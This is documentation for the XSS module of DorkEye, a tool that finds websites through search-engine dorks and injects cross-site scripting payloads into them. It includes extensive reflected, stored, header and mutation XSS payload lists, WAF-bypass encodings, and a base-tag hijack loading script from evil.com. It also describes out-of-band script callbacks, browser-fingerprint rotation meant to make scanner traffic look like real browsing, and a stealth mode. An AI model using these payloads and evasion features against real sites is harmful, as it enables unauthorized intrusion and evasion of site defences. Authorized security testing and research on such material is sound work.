<img width="1264" height="843" alt="image" src="https://github.com/user-attachments/assets/4c45212e-a457-43fe-ac6e-11ebe3757188" />

# XSS Detection — DorkEye Project

DorkEye includes a built-in multi-method XSS detection engine supporting reflected, stored, DOM-based, and header-based injection — no browser or external tool required.

-----

## Enable XSS Testing

### During a dork search

```bash
python dorkeye.py -d "inurl:search.php?q=" --xss -o results.json
python dorkeye.py --dg=xss --mode=medium --xss --stealth -o results.json
```

### Direct test on a single URL

```bash
python dorkeye.py -u "https://example.com/search.php?q=test" --xss
python dorkeye.py -u "https://example.com/search.php?q=test" --xss --stealth -o result.json
```

### Re-test a saved results file

```bash
python dorkeye.py -f Dump/results.json --xss -o retest.json
```

### Select XSS type

```bash
python dorkeye.py -u "https://example.com/?q=x" --xss --xss-type reflected
python dorkeye.py -u "https://example.com/?q=x" --xss --xss-type dom
python dorkeye.py -u "https://example.com/?q=x" --xss --xss-type all   # default
```

-----

## Architecture Overview

`Tools/xss_detector.py` is a self-contained module. Its main components:

|Component               |Description                                                             |
|------------------------|------------------------------------------------------------------------|
|`XSSConfidence`         |Enum: `none → low → medium → high → critical`                           |
|`XSSDetector`           |Main class — orchestrates all detection methods                         |
|`CircuitBreaker`        |Shared class from `sqli_detector` — tracks unreachable hosts            |
|`HTTPFingerprintRotator`|Shared class from `sqli_detector` — rotates browser profiles per request|
|`WAF_SIGNATURES`        |Shared dict from `sqli_detector` — 12 WAF signatures                    |
|`_interruptible_sleep`  |Shared helper — sleeps in 0.25 s steps, honours interrupt flags         |

**[NEW-9] Granular per-symbol import fallback:** each shared symbol (`HTTPFingerprintRotator`, `CircuitBreaker`, `WAF_SIGNATURES`, `_interruptible_sleep`) is imported with its own individual `try/except`. A partial sqli import no longer silently disables everything — only the missing symbol falls back to the local implementation.

-----

## HTTP Fingerprint Rotation

Every outgoing GET and POST request automatically rotates its browser fingerprint using the shared `HTTPFingerprintRotator`, making scanner traffic indistinguishable from real browser activity.

The same `http_fingerprints.json` used by the SQLi module is reused — no separate config needed.

-----

## Circuit Breaker

`XSSDetector` uses the shared `CircuitBreaker` class (not an inline set). Dead hosts are tracked at `scheme://netloc` granularity. Any `ConnectTimeout` or `ConnectionError` during `_run_interruptible()` automatically marks the host as dead.

```python
detector.circuit_breaker.reset()  # re-enable all hosts between scans
```

-----

## Interrupt Flags

```python
_exit_requested: bool = False   # Ctrl+C → abort everything
_skip_current:   bool = False   # second Ctrl+C → skip current URL only
```

Both local flags and the shared sqli module flags are checked via `_get_exit_flag()` / `_get_skip_flag()`. All in-loop sleeps use `_safe_sleep()` — never `time.sleep()` directly. Flags are checked at every payload iteration and sleep step.

-----

## Timing Constants

|Constant                    |Value                                 |
|----------------------------|--------------------------------------|
|`_CONNECT_TIMEOUT`          |4 s                                   |
|`_DEFAULT_READ`             |8 s                                   |
|`_PROBE_SAMPLE_BYTES`       |8 192 B                               |
|`_MAX_EXTERNAL_SCRIPT_BYTES`|512 000 B (500 KB cap for external JS)|

-----

## OOB (Out-of-Band) Support

Pass an interactsh/Burp Collaborator endpoint as `oob_url` to enable blind/OOB payloads appended to the reflected payload set:

```python
detector = XSSDetector(oob_url="your.interactsh.io/callback")
```

OOB payloads injected:

```
<script src="//your.interactsh.io/callback/MPXSS7x"></script>
<img src="//your.interactsh.io/callback/MPXSS7x">
'"><script src="//your.interactsh.io/callback/MPXSS7x"></script>
```

-----

## Detection Methods

`XSSDetector` runs up to **4 methods** depending on the `xss_type` argument and parameter availability.

-----

### 1. Reflected XSS

Injects payloads into GET parameters and checks for unescaped reflection in the HTML response body.

**[NEW-1] Parameter pre-screening performance overhaul:**

- **Fast-path:** if the response length differs from baseline by **> 50 bytes**, variation is declared immediately without running difflib.
- **difflib cap:** comparisons are limited to the first **8 192 bytes** (`_PROBE_SAMPLE_BYTES`) of each body — prevents O(n²) on large pages.
- Similarity threshold: parameter is considered interesting if the sampled ratio < **0.97**.

Parameters are sorted by XSS attack-surface priority before testing. Testing stops on the first confirmed hit to minimise total requests.

**Reflected payloads — full list:**

```
# Classic script injection
<script>alert('MPXSS7x')</script>
"><script>alert("MPXSS7x")</script>
'><script>alert('MPXSS7x')</script>
<script>alert`MPXSS7x`</script>
<script type='text/javascript'>alert('MPXSS7x')</script>

# Image / media onerror
<img src=x onerror=alert("MPXSS7x")>
"><img src=x onerror=alert("MPXSS7x")>
<video src=x onerror=alert('MPXSS7x')>
<audio src=x onerror=alert('MPXSS7x')>
<source src=x onerror=alert('MPXSS7x')>

# SVG / MathML
<svg/onload=alert('MPXSS7x')>
"><svg onload=alert("MPXSS7x")>
<svg><script>alert('MPXSS7x')</script></svg>
<svg><animate onbegin=alert('MPXSS7x') attributeName=x dur=1s>
<math><mtext></mtext><script>alert('MPXSS7x')</script></math>

# HTML5 autofocus event handlers
<input autofocus onfocus=alert('MPXSS7x')>
<select autofocus onfocus=alert('MPXSS7x')>
<textarea autofocus onfocus=alert('MPXSS7x')>
<details open ontoggle=alert('MPXSS7x')>

# Body / iframe / form
<body onload=alert("MPXSS7x")>
<iframe srcdoc="<script>alert('MPXSS7x')</script>">
<form><button formaction=javascript:alert('MPXSS7x')>X</button></form>

# Break out of quoted HTML attribute
" onmouseover="alert('MPXSS7x')" x="
' onmouseover='alert("MPXSS7x")' x='
" onfocus="alert('MPXSS7x')" autofocus="

# Href javascript: protocol
<a href=javascript:alert('MPXSS7x')>click</a>

# JS context escapes
';alert('MPXSS7x')//
";alert("MPXSS7x")//
`<script>alert('MPXSS7x')</script>`

# [NEW-2] Template / server-side expression injection
${alert('MPXSS7x')}
{{constructor.constructor('alert("MPXSS7x")')()}}    # Angular/Vue SSTI
#{alert('MPXSS7x')}                                   # Ruby/Thymeleaf

# [NEW-2] Mutation XSS (mXSS) — survives old DOMPurify / innerHTML round-trips
<noscript><p title="</noscript><img src=x onerror=alert('MPXSS7x')">
<listing><img src="</listing><img src=x onerror=alert('MPXSS7x')">

# [NEW-2] CSS injection
<link rel=stylesheet href=javascript:alert('MPXSS7x')>

# [NEW-2] Polyglot — valid in HTML attribute, JS string, and bare HTML simultaneously
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('MPXSS7x') )//...

# [NEW-2] Prototype pollution via XSS gadget
<script>Object.prototype.x=alert('MPXSS7x')</script>

# [NEW-2] Noscript fallback
<noscript><img src=x onerror=alert('MPXSS7x')></noscript>

# [NEW-2] Base tag hijack
<base href=//evil.com/><script src=/x.js></script>

# [NEW-2] Meta refresh to javascript:
<meta http-equiv=refresh content='0;url=javascript:alert("MPXSS7x")'>

# [NEW-2] Object / embed (legacy browsers, intranet targets)
<object data=javascript:alert('MPXSS7x')>
<embed src=javascript:alert('MPXSS7x')>

# [NEW-2] Tabindex + focus event (no click required)
<div tabindex=1 onfocus=alert('MPXSS7x') id=x></div><script>x.focus()</script>

# [NEW-2] Srcdoc sandbox allow-scripts bypass
<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;" sandbox="allow-scripts">
```

**WAF-bypass encoding variants — full list:**

```
# Case mixing
<ScRiPt>alert('MPXSS7x')</sCrIpT>
<iMg src=x oNeRrOr=alert('MPXSS7x')>

# HTML entity / unicode encoding
<svg/onload=&#97;lert('MPXSS7x')>
&#60;script&#62;alert('MPXSS7x')&#60;/script&#62;
\u003Cscript\u003Ealert('MPXSS7x')\u003C/script\u003E

# URL encoding
%3Cscript%3Ealert('MPXSS7x')%3C/script%3E
%3Cimg+src%3Dx+onerror%3Dalert('MPXSS7x')%3E

# Double URL encoding
%253Cscript%253Ealert('MPXSS7x')%253C/script%253E

# Comment insertion (breaks simple keyword filters)
<scr<!---->ipt>alert('MPXSS7x')</scr<!---->ipt>
<img src=x o/**/nerror=alert('MPXSS7x')>

# Tab / newline in tag (bypasses simple regex WAFs)
<img	src=x	onerror=alert('MPXSS7x')>
<img
src=x
onerror=alert('MPXSS7x')>

# Backtick attribute (legacy IE)
<img src=`x` onerror=`alert('MPXSS7x')`>

# Data URI iframe
<iframe src="data:text/html,<script>alert('MPXSS7x')</script>">

# SVG image href with onerror
<svg><image href="data:," onerror=alert('MPXSS7x')>

# CSS expression (legacy IE)
<div style="width:expression(alert('MPXSS7x'))">

# [NEW-3] Null byte injection — some WAFs stop scanning at \x00
<scr\x00ipt>alert('MPXSS7x')</scr\x00ipt>
<img\x00src=x onerror=alert('MPXSS7x')>

# [NEW-3] Void operator — avoids alert() pattern matching
<script>void(alert('MPXSS7x'))</script>
<img src=x onerror=void(alert('MPXSS7x'))>

# [NEW-3] Self-closing SVG with explicit namespace
<svg xmlns='http://www.w3.org/2000/svg' onload=alert('MPXSS7x')/>

# [NEW-3] Form action with javascript: URI
<form action=javascript:alert('MPXSS7x')><button>X</button></form>

# [NEW-3] Input type=image — often overlooked by filters
<input type=image src=x onerror=alert('MPXSS7x')>

# [NEW-3] Content-sniffing bypass (marker inside comment)
<!--<script>alert('MPXSS7x')</script>-->

# [NEW-3] RPO (Relative Path Overwrite)
/%2F..%2F..%2Fevil.js

# [NEW-3] Script tag with rare charset (confuses some parsers)
<script charset="x-mac-farsi">\xd0)</script>
```

**Reflection check:** the unique marker `MPXSS7x` must appear in the response body AND must NOT be surrounded by any known encoding pattern. Encoded reflections are treated as safe (no false positive).

**Patterns that mark a reflection as safe (HTML-encoded):**

```
&lt;script    &lt;img    &lt;svg    &lt;iframe    &lt;details    &lt;body
&lt;input    &lt;video    &lt;audio    &#60;    &#x3c;    %3Cscript
\u003C    &amp;lt;    \x3c
```

**Additional false-positive filters:**

- Reflection inside an **unclosed HTML comment** (`<!-- ... -->`) is rejected
- Reflection inside a `<script>` block using **Unicode escaping** (`\u003C`) is rejected
- `_payload_structure_present()` verifies the core dangerous HTML structure (tag, event handler, or `javascript:`) survives in a narrow window around the marker position — prevents hits where angle brackets are stripped but the marker text appears in an error message

**CSP check:** if a strict `Content-Security-Policy` is present (with `script-src` or `default-src` but without `unsafe-inline`), confidence is capped at **MEDIUM** regardless of unescaped reflection.

|Condition                        |Confidence|
|---------------------------------|----------|
|Unescaped reflection, no CSP     |HIGH      |
|Unescaped reflection, CSP present|MEDIUM    |

-----

### 2. Stored XSS

POSTs payloads to each parameter individually, then refetches via GET and checks whether the marker survived in the persisted page.

**[NEW-8] CSRF note:** blind POST without a CSRF token will silently receive 403/419 on token-protected endpoints. A `csrf_note` field is always included in the stored result dict to flag this limitation for manual follow-up.

Two-stage detection:

|Stage             |Trigger                                              |Confidence|
|------------------|-----------------------------------------------------|----------|
|1 — immediate echo|Marker found unescaped in the POST response          |MEDIUM    |
|2 — true stored   |Marker found unescaped in the subsequent GET response|HIGH      |

**Payloads:**

```
<script>alert('MPXSS7x')</script>
<img src=x onerror=alert("MPXSS7x")>
<svg/onload=alert('MPXSS7x')>
<input autofocus onfocus=alert('MPXSS7x')>
<details open ontoggle=alert('MPXSS7x')>
```

**Parameter injection:** each parameter is tested individually (not blasted all at once), so the vulnerable field can be identified precisely.

WAF detection runs on every POST response. A WAF hit immediately breaks both the payload loop and the parameter loop.

-----

### 3. DOM-based XSS

Fetches the page and performs static JavaScript source-to-sink analysis. No browser is required.

**[NEW-6] Minified JS handling:** `_tokenise_js()` now splits on **both newlines AND semicolons**. Long lines (> 500 chars, typical of webpack/React bundles) are further split on `;` into individual statements before block assembly. This prevents the entire minified bundle from becoming a single enormous block that defeats per-block analysis.

**Analysis scope:**

1. Inline `<script>` blocks extracted from page HTML
1. External scripts referenced via `<script src="">` — fetched separately (cap: 5 files, max 500 KB each) and validated against the SSRF guard before fetch
1. Full page body used as fallback if no inline scripts found

**Safe-pattern filter ([FIX-8]):** lines matching known-safe patterns are stripped before source/sink analysis. Patterns:

```
# Analytics / tracking scripts
//.*(?:analytics|tracking|google-analytics|gtag|ga\()

# Static string assignment (not data-flow)
document\.write\s*\(\s*['"]
innerHTML\s*=\s*['"]

# Code comments only
//\s*(?:TODO|FIXME|NOTE|eslint)

# Block comments (DOTALL — handles multi-line)
/\*[\s\S]*?\*/
```

**Source-to-sink co-occurrence:** source and sink must appear in the **same 40-line sliding block** (50% overlap). This prevents false positives from incidental co-occurrence across unrelated code sections.

**[NEW-4] DOM sources — full list:**

```
# Original sources
location.hash          location.search        location.href
document.URL           document.documentURI   document.referrer
window.name            history.state

# [NEW-4] Additional sources
localStorage.getItem   sessionStorage.getItem
postMessage
XMLHttpRequest.responseText
fetch(
document.cookie
.getAttribute(
WebSocket
```

**[NEW-5] DOM sinks — full list:**

```
# Original sinks
document.write(          document.writeln(      .innerHTML =
.outerHTML =             eval(                  setTimeout('
setInterval('            location.href =        location.assign(
location.replace(        insertAdjacentHTML(
.setAttribute('src'      .setAttribute('href'   .setAttribute('on*'
document.createElement('script'                .src = location|window

# [NEW-5] Additional sinks
.createContextualFragment(     # Range API — dangerous sink
DOMParser                      # parseFromString with text/html
window.open(                   # window.open with javascript: href
importScripts(                 # Web Worker — imports external script
.href =                        # anchor/location href assignment
.action =                      # form action reassignment
.srcdoc =                      # iframe srcdoc assignment
```

**Confidence:**

|Condition                      |Confidence|
|-------------------------------|----------|
|1 source + 1 sink co-occurrence|LOW       |
|2+ distinct source/sink pairs  |MEDIUM    |

-----

### 4. Header-based XSS

Injects the XSS marker into HTTP request headers that servers commonly reflect in error pages, debug output, or log-replay interfaces.

**[NEW-7] 7-payload list** instead of a single fixed `<script>` tag. WAFs almost universally block `<script>` in headers — softer variants improve hit rate on targets that reflect headers in error pages without heavy filtering.

**Headers tested:**

```
X-Forwarded-For
Referer
User-Agent
X-Forwarded-Host
X-Original-URL
```

**[NEW-7] Header payload variants:**

```
<script>alert('MPXSS7x')</script>        # classic — blocked by most WAFs
<img src=x onerror=alert('MPXSS7x')>     # event handler variant
<svg/onload=alert('MPXSS7x')>            # SVG variant
'MPXSS7x'                                # single-quote context probe
"MPXSS7x"                                # double-quote context probe
MPXSS7x<br>                              # soft injection probe
javascript:alert('MPXSS7x')             # href/src reflection probe
```

Each payload is tried per header. WAF detection runs per response; a WAF hit on a header breaks that header’s payload loop and moves to the next header.

Confidence: **HIGH** on unescaped reflection.

-----

## Parameter Prioritization

Parameters are sorted into three tiers before testing. XSS-specific priority differs from the SQLi order — reflection-prone and redirect parameters rank highest.

|Priority|Names                                                                                                                                                                                                                                                                                                                               |
|--------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
|High    |`q`, `query`, `search`, `s`, `keyword`, `kw`, `term`, `find`, `name`, `user`, `username`, `message`, `msg`, `comment`, `text`, `input`, `value`, `data`, `content`, `body`, `title`, `description`, `subject`, `note`, `info`, `redirect`, `url`, `next`, `return`, `callback`, `ref`, `goto`, `redir`, `dest`, `target`, `location`|
|Medium  |`id`, `page`, `cat`, `category`, `type`, `lang`, `language`, `filter`, `tag`, `label`, `topic`, `section`, `email`, `mail`, `first`, `last`, `city`, `country`, `region`                                                                                                                                                            |
|Low     |Everything else                                                                                                                                                                                                                                                                                                                     |

-----

## WAF Detection

WAF checks run on the baseline response and on each injected response. Signatures are matched against header keys, header values, and the first 1500 chars of the body.

**Detected WAFs:**

|WAF         |Detection signals                        |
|------------|-----------------------------------------|
|Cloudflare  |`cf-ray`, `cloudflare`                   |
|Wordfence   |`wordfence`, `generated by wordfence`    |
|mod_security|`mod_security`, `modsecurity`            |
|Sucuri      |`x-sucuri-id`, `sucuri`                  |
|Imperva     |`x-iinfo`, `incapsula`                   |
|Akamai      |`akamai`, `x-akamai-transformed`         |
|F5 BIG-IP   |`x-waf-event-info`, `bigipserver`        |
|Barracuda   |`barra_counter_session`, `barracuda`     |
|FortiWeb    |`fortigate`, `fortiweb`                  |
|AWS WAF     |`x-amzn-requestid` + status 403          |
|DenyAll     |`denyall`, `x-denyall`                   |
|Reblaze     |`x-reblaze-protection`                   |
|Generic     |Status 403 / 406 / 429 + body < 600 chars|

When a WAF is detected, the current method is aborted for that URL.

-----

## Scoring & Confidence Aggregation

`test_xss()` aggregates findings from all enabled methods using a confidence rank score:

|Confidence value|Rank|
|----------------|----|
|`critical`      |4   |
|`high`          |3   |
|`medium`        |2   |
|`low`           |1   |
|`none`          |0   |

The sum of ranks across all vulnerable tests determines `overall_confidence`:

|Total score|`overall_confidence`|
|-----------|--------------------|
|≥ 5        |`critical`          |
|≥ 3        |`high`              |
|≥ 2        |`medium`            |
|< 2        |`low`               |

|Level     |Meaning                                                              |
|----------|---------------------------------------------------------------------|
|`critical`|Reflected or stored XSS confirmed with no CSP — direct exploitability|
|`high`    |Unescaped reflection confirmed / true stored / header-based hit      |
|`medium`  |POST echo / DOM with 2+ source-sink pairs / reflected under CSP      |
|`low`     |DOM with single source+sink pair                                     |

-----

## Return Value Structure

`test_xss(url)` returns:

```json
{
  "tested":             true,
  "vulnerable":         true,
  "overall_confidence": "high",
  "xss_types_found":    ["reflected"],
  "waf_detected":       null,
  "csp_detected":       false,
  "tests": [
    {
      "type":         "reflected",
      "vulnerable":   true,
      "confidence":   "high",
      "parameters":   ["q"],
      "payload":      "<script>alert('MPXSS7x')</script>",
      "evidence":     ["Unescaped reflection in param [q]: <script>alert('MPXSS7x')</script>"],
      "waf":          null,
      "csp_detected": false
    },
    {
      "type":       "stored",
      "vulnerable": false,
      "confidence": "none",
      "parameters": [],
      "payload":    null,
      "evidence":   [],
      "waf":        null,
      "csrf_note":  "Stored XSS test uses blind POST without CSRF token. Token-protected endpoints may return 403/419 silently — a 'not vulnerable' result on those should be verified manually."
    },
    {
      "type":       "dom",
      "vulnerable": false,
      "confidence": "none",
      "sources":    [],
      "sinks":      [],
      "evidence":   [],
      "waf":        null
    },
    {
      "type":       "header",
      "vulnerable": false,
      "confidence": "none",
      "headers":    [],
      "payload":    null,
      "evidence":   [],
      "waf":        null
    }
  ],
  "message": "XSS detected — type(s): reflected  confidence: high"
}
```

-----

## Stealth Mode

```bash
python dorkeye.py -u "https://example.com/?q=x" --xss --stealth
```

With `--stealth`:

|Phase                     |Normal|Stealth                      |
|--------------------------|------|-----------------------------|
|Between reflected payloads|—     |0.5–1.5 s                    |
|Between stored payloads   |—     |1.0–2.5 s                    |
|Between header tests      |—     |0.5–1.5 s                    |
|Fingerprint profiles      |all   |conservative browser profiles|

-----

## Python API

```python
from Tools.xss_detector import XSSDetector

# Standard — all methods
detector = XSSDetector(stealth=False, timeout=8, xss_type="all")
result = detector.test_xss("https://example.com/search.php?q=hello")

# Reflected only
detector.xss_type = "reflected"
result = detector.test_xss("https://example.com/search.php?q=hello")

# With OOB/blind callback endpoint
detector = XSSDetector(oob_url="your.interactsh.io/token")
result = detector.test_xss("https://example.com/search.php?q=hello")

# Optional progress callback
detector._status_cb = lambda phase: print(f"[xss] {phase}")

# Reset circuit breaker between independent scans
detector.circuit_breaker.reset()
```
